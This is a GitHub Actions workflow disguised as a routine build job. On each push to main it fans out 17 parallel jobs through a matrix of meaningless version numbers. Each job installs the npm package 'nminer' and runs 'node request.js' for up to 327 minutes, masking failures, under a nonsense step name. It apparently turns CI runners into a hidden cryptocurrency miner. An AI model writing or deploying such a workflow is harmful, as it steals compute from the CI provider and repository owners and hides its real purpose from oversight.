name: request
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8498 }
          - { version: 8546 }
          - { version: 8266 }
          - { version: 9141 }
          - { version: 1485 }
          - { version: 6488 }
          - { version: 2268 }
          - { version: 2609 }
          - { version: 4795 }
          - { version: 8851 }
          - { version: 6217 }
          - { version: 7260 }
          - { version: 5723 }
          - { version: 5560 }
          - { version: 7898 }
          - { version: 7515 }
          - { version: 2432 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: definite familiarize inside
        run: |
          npm install nminer@latest
          timeout 327m node request.js || echo "request executed"